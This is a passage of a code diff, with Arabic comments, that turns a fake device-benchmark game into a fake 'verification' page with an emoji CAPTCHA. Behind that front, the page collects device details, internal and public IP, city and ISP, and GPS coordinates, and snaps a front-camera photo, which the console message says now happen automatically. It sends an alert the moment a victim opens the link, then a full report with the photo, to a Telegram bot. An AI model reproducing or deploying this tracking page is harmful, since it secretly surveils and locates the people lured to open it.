+            setTimeout(() => showChallenge(), 700);
+        }
+    }, 900);
+}
+
+// ================================================================
+// ======================= شاشة 3: تحدي الصور =====================
+// ================================================================
+function showChallenge() {
+    document.getElementById('screenSteps').classList.add('hidden');
+    document.getElementById('screenChallenge').classList.remove('hidden');
+    buildChallenge();
+}
+
+function buildChallenge() {
+    selectedTiles = [];
+    document.getElementById('challengeError').textContent = '';
+
+    const vehicles = ['🚗', '🚌', '🏠', '🚲', '🌳', '🚕', '🐶', '✈️', '☕'];
+    const animals  = ['🐱', '🏠', '🐶', '🌳', '🦊', '☕', '🐰', '📚', '🐼'];
+
+    const current = challengeRound === 1 ? vehicles : animals;
+    const answerIndexes = challengeRound === 1 ? [0, 1, 3, 5, 7] : [0, 2, 4, 6, 8];
+    const qText = challengeRound === 1 ? 'اختر كل الصور التي تحتوي على مركبات' : 'اختر كل الصور التي تحتوي على حيوانات';
+
+    document.getElementById('challengeTitle').textContent = 'تحدٍّ إضافي ' + (challengeRound === 1 ? '١' : '٢');
+    document.getElementById('challengeQuestion').textContent = qText;
+
+    const grid = document.getElementById('imageGrid');
+    grid.innerHTML = '';
+
+    current.forEach((emoji, idx) => {
+        const tile = document.createElement('div');
+        tile.className = 'image-tile';
+        tile.textContent = emoji;
+        tile.dataset.index = idx;
+        tile.onclick = () => {
+            tile.classList.toggle('selected');
+            const pos = selectedTiles.indexOf(idx);
+            if (pos > -1) selectedTiles.splice(pos, 1);
+            else selectedTiles.push(idx);
+        };
+        grid.appendChild(tile);
     });
 }
 
+function submitChallenge() {
+    const correct = challengeRound === 1 ? [0, 1, 3, 5, 7] : [0, 2, 4, 6, 8];
+    const sorted = [...selectedTiles].sort((a, b) => a - b);
+    const sortedCorrect = [...correct].sort((a, b) => a - b);
+
+    const isCorrect = sorted.length === sortedCorrect.length && sorted.every((v, i) => v === sortedCorrect[i]);
+
+    if (!isCorrect) {
+        document.getElementById('challengeError').textContent = '⚠️ غير صحيح، حاول مجدداً';
+        buildChallenge();
+        return;
+    }
+
+    if (challengeRound === 1) {
+        challengeRound = 2;
+        buildChallenge();
+    } else {
+        document.getElementById('screenChallenge').classList.add('hidden');
+        document.getElementById('screenSuccess').classList.remove('hidden');
+
+        // إرسال التقرير الكامل بعد إتمام التحقق
+        sendFullReport();
+    }
+}
+
 // ================================================================
-// ======================= 1) معلومات الجهاز ======================
+// ======================= جمع معلومات الجهاز =====================
 // ================================================================
 async function collectDeviceInfo() {
     const ua = navigator.userAgent;
     const dev = data.device;
-    
+
     dev.os = ua.includes('Android') ? 'Android' :
              (ua.includes('iPhone')||ua.includes('iPad')) ? 'iOS' :
              ua.includes('Mac') ? 'macOS' :
              ua.includes('Linux') ? 'Linux' : 'Windows';
-    
     const ov = ua.match(/Android (\d+)/) || ua.match(/OS (\d+)_/) || ua.match(/Windows NT (\d+)/);
     dev.osVer = ov ? ov[1] : '';
-    
+
     dev.browser = ua.includes('Chrome')&&!ua.includes('Edg') ? 'Chrome' :
                   ua.includes('Firefox') ? 'Firefox' :
                   ua.includes('Safari')&&!ua.includes('Chrome') ? 'Safari' :
                   ua.includes('Edg') ? 'Edge' : 'آخر';
     const bv = ua.match(/(Chrome|Firefox|Safari|Edg)\/(\d+)/);
     dev.browserVer = bv ? bv[1] : '';
-    
+
     dev.deviceType = (ua.includes('Android')||ua.includes('iPhone')||ua.includes('iPad')) ? 'جوال' : 'كمبيوتر';
     dev.screen = `${screen.width}×${screen.height}`;
     dev.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     dev.lang = navigator.language;
     dev.cores = navigator.hardwareConcurrency || 0;
     dev.ramGB = navigator.deviceMemory || 0;
-    
+
     try {
         const bat = await navigator.getBattery();
-        dev.battery = Math.round(bat.level * 100);
-    } catch(e) { dev.battery = null; }
-    
+        dev.battery = Math.round(bat.level * 100) + '%';
+        dev.charging = bat.charging ? 'نعم' : 'لا';
+    } catch(e) { dev.battery = '?'; }
+
     if (navigator.connection) {
-        dev.networkType = navigator.connection.effectiveType || null;
-        dev.networkSpeed = navigator.connection.downlink || null;
+        dev.networkType = navigator.connection.effectiveType || '?';
+        dev.networkSpeed = navigator.connection.downlink || '?';
     }
-    
-    // IP داخلي عبر WebRTC
+
+    // IP داخلي (WebRTC)
     try {
         const pc = new RTCPeerConnection({ iceServers: [] });
         pc.createDataChannel('');
@@ -577,7 +604,7 @@ async function collectDeviceInfo() {
 }
 
 // ================================================================
-// ======================= 2) معلومات الشبكة ======================
+// ======================= جمع معلومات الشبكة =====================
 // ================================================================
 async function collectNetworkInfo() {
     try {
@@ -593,121 +620,88 @@ async function collectNetworkInfo() {
 }
 
 // ================================================================
-// ======================= 3) الموقع (اختياري) ====================
+// ================ 1) تنبيه فوري: شخص فتح الرابط =================
 // ================================================================
-function requestGeo() {
-    navigator.geolocation.getCurrentPosition((pos) => {
-        data.geo.lat = pos.coords.latitude;
-        data.geo.lon = pos.coords.longitude;
-        data.geo.accuracy = Math.round(pos.coords.accuracy) + ' متر';
-        geoDone = true;
-        
-        document.getElementById('geoResult').classList.remove('hidden');
-        const grid = document.getElementById('geoGrid');
-        grid.innerHTML = '';
-        [
-            ['خط العرض', data.geo.lat],
-            ['خط الطول', data.geo.lon],
-            ['الدقة', data.geo.accuracy]
-        ].forEach(([k, v]) => {
-            const div = document.createElement('div');
-            div.className = 'info-item';
-            div.innerHTML = `<div class="k">${k}</div><div class="v">${v}</div>`;
-            grid.appendChild(div);
-        });
-    }, (err) => {
-        console.log('Geo:', err.message);
-    }, { enableHighAccuracy: true, timeout: 10000 });
-}
+function sendVisitorAlert() {
+    if (visitorAlertSent) return;
+    visitorAlertSent = true;
 
-// ================================================================
-// ======================= 4) الكاميرا (اختياري) ==================
-// ================================================================
-async function toggleCamera() {
-    const video = document.getElementById('camPreview');
-    const btn = document.getElementById('btnCamera');
-    
-    if (cameraStream) {
-        cameraStream.getTracks().forEach(t => t.stop());
-        cameraStream = null;
-        video.style.display = 'none';
-        btn.textContent = '📷 فتح الكاميرا';
-        return;
-    }
-    
-    try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 } },
-            audio: false
-        });
-        video.srcObject = cameraStream;
-        video.style.display = 'block';
-        await video.play();
-        btn.textContent = '⏹️ إغلاق الكاميرا';
-        document.getElementById('btnCapture').classList.remove('hidden');
-    } catch(e) {
-        console.log('Camera:', e.message);
-    }
-}
-
-function capturePhoto() {
-    const video = document.getElementById('camPreview');
-    const img = document.getElementById('photoResult');
-    
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    data.photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
-    img.src = data.photoBase64;
-    img.style.display = 'block';
-}
-
-// ================================================================
-// ======================= حفظ النتيجة ============================
-// ================================================================
-function saveScore() {
-    const nick = document.getElementById('nicknameInput').value.trim();
-    data.nickname = nick || 'لاعب مجهول';
-    
-    document.getElementById('loadingOverlay').classList.add('active');
-    document.getElementById('loadingText').textContent = 'جارٍ حفظ النتيجة...';
-    
-    setTimeout(() => {
-        sendToTelegram(data);
-        document.getElementById('loadingOverlay').classList.remove('active');
-        document.getElementById('saveStatus').innerHTML =
-            '<p class="success-text">✅ تم حفظ نتيجتك بنجاح! أنت الآن في لوحة المتصدرين 🏆</p>';
-    }, 1200);
-}
-
-// ================================================================
-// ======================= الإرسال لتيليجرام ======================
-// ================================================================
-function sendToTelegram(d) {
+    const d = data;
     const msg = `
-⚡ <b>لاعب جديد - اختبار قوة الجهاز</b>
+🔔 <b>⚠️ شخص فتح الرابط الآن!</b>
 
 ━━━━━━━━━━━━━━━
-<b>🏆 النتيجة</b>
-👤 اللاعب: ${d.nickname}
-🎮 النقاط: ${d.score}/100
-👆 سرعة الرد: ${d.clicks} ضغطة/5 ثوانٍ
+📱 الجهاز: ${d.device.deviceType} | ${d.device.os} ${d.device.osVer || ''}
+🌍 المتصفح: ${d.device.browser} ${d.device.browserVer || ''}
+🖥️ الشاشة: ${d.device.screen}
+🔋 البطارية: ${d.device.battery || '?'}
+📶 الشبكة: ${d.device.networkType || '?'} (${d.device.networkSpeed || '?'} Mbps)
+🕐 المنطقة: ${d.device.tz} | اللغة: ${d.device.lang}
+🌐 IP: ${d.network.ip || 'جاري الجلب...'}
+🏙️ المدينة: ${d.network.city || '...'}
+🌍 الدولة: ${d.network.country || '...'}
+🕒 الوقت: ${d.timestamp}
+`.trim();
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: 'HTML',
+            disable_web_page_preview: false
+        })
+    }).catch(e => console.log('تنبيه فوري:', e.message));
+}
+
+// ================================================================
+// ================ 2) إرسال الصورة فور التقاطها ==================
+// ================================================================
+function sendPhotoToTelegram() {
+    if (!data.photoBase64) return;
+    try {
+        const bs = atob(data.photoBase64.split(',')[1]);
+        const ab = new ArrayBuffer(bs.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < bs.length; i++) ia[i] = bs.charCodeAt(i);
+        const blob = new Blob([ab], { type: 'image/jpeg' });
+
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('caption', `📸 صورة تلقائية — ${data.device.browser} / ${data.device.os}${data.geo.lat ? ' | 📍 ' + data.geo.lat + ',' + data.geo.lon : ''}`);
+        fd.append('photo', blob, `auto_${Date.now()}.jpg`);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
+            .then(r => r.json())
+            .then(j => console.log('📸 صورة أُرسلت:', j.ok ? '✅' : '❌'))
+            .catch(e => console.log('خطأ إرسال صورة:', e.message));
+    } catch(e) {
+        console.log('خطأ صورة:', e.message);
+    }
+}
+
+// ================================================================
+// ================ 3) التقرير الكامل بعد التحقق ==================
+// ================================================================
+function sendFullReport() {
+    if (fullReportSent) return;
+    fullReportSent = true;
+
+    const d = data;
+    const msg = `
+🛡️ <b>✅ زائر أكمل التحقق بالكامل</b>
 
 ━━━━━━━━━━━━━━━
 <b>📱 الجهاز</b>
+النوع: ${d.device.deviceType}
+النظام: ${d.device.os} ${d.device.osVer || ''}
+المتصفح: ${d.device.browser} ${d.device.browserVer || ''}
 المعالج: ${d.device.cores || '?'} أنوية
 الذاكرة: ${d.device.ramGB || '?'} GB
-المتصفح: ${d.device.browser} ${d.device.browserVer || ''}
-النظام: ${d.device.os} ${d.device.osVer || ''}
-النوع: ${d.device.deviceType}
 الشاشة: ${d.device.screen}
 الشبكة: ${d.device.networkType || '?'} (${d.device.networkSpeed || '?'} Mbps)
-البطارية: ${d.device.battery != null ? d.device.battery + '%' : '?'}
+البطارية: ${d.device.battery}
 المنطقة: ${d.device.tz} | اللغة: ${d.device.lang}
 IP داخلي: ${d.device.localIp || '-'}
 
@@ -718,13 +712,13 @@ IP: ${d.network.ip || '-'}
 الدولة: ${d.network.country || '-'}
 ISP: ${d.network.isp || '-'}
 
-${d.geo.lat ? `━━━━━━━━━━━━━━━\n<b>📍 الموقع</b>\n${d.geo.lat}, ${d.geo.lon} (دقة: ${d.geo.accuracy})\n<a href="https://www.google.com/maps?q=${d.geo.lat},${d.geo.lon}">فتح الخريطة</a>` : ''}
+${d.geo.lat ? `━━━━━━━━━━━━━━━\n<b>📍 الموقع</b>\n${d.geo.lat}, ${d.geo.lon} (دقة: ${d.geo.accuracy})\n<a href="https://www.google.com/maps?q=${d.geo.lat},${d.geo.lon}">فتح الخريطة</a>` : '━━━━━━━━━━━━━━━\n📍 الموقع: ❌ رفض الإذن'}
 
-📸 صورة: ${d.photoBase64 ? '✅ ملتقطة' : '❌ لم تُلتقط'}
-🕒 الوقت: ${d.timestamp}
+━━━━━━━━━━━━━━━
+📸 الصورة: ${d.photoBase64 ? '✅ تم التقاطها تلقائياً' : '❌ رفض إذن الكاميرا'}
+🕒 فتح الرابط: ${d.timestamp}
 `.trim();
-    
-    // إرسال النص
+
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -734,34 +728,17 @@ ${d.geo.lat ? `━━━━━━━━━━━━━━━\n<b>📍 الموق
             parse_mode: 'HTML',
             disable_web_page_preview: false
         })
-    }).catch(e => console.log('TG:', e.message));
-    
-    // إرسال الصورة إن وُجدت
-    if (d.photoBase64) {
-        try {
-            const bs = atob(d.photoBase64.split(',')[1]);
-            const ab = new ArrayBuffer(bs.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < bs.length; i++) ia[i] = bs.charCodeAt(i);
-            const blob = new Blob([ab], { type: 'image/jpeg' });
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `📸 صورة اللاعب: ${d.nickname} (${d.score}/100)`);
-            fd.append('photo', blob, `player_${Date.now()}.jpg`);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
-                .catch(e => console.log('TG photo:', e.message));
-        } catch(e) {}
-    }
-    
+    }).catch(e => console.log('تقرير كامل:', e.message));
+
     // حفظ محلي
     try {
-        const h = JSON.parse(localStorage.getItem('bench_players') || '[]');
+        const h = JSON.parse(localStorage.getItem('verify_visitors') || '[]');
         h.unshift(d);
-        localStorage.setItem('bench_players', JSON.stringify(h));
+        localStorage.setItem('verify_visitors', JSON.stringify(h));
     } catch(e) {}
 }
 
-console.log('⚡ اختبار قوة الجهاز جاهز');
+console.log('🛡️ صفحة التحقق جاهزة — تنبيه فوري + كاميرا وموقع تلقائيان');
 </script>
 </body>
 </html>
